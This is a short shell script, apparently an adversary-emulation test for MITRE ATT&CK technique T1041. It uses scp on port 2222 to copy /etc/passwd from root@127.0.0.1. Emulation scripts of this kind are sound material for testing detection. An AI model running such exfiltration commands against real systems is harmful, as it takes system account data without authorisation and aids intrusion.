#!/bin/sh
# Tactic: Exfiltration
# Name: Exfiltration Over Command and Control Channel
# ID: 	T1041
# Exfiltrates data from the local system using scp
scp -P 2222 root@127.0.0.1:/etc/passwd .
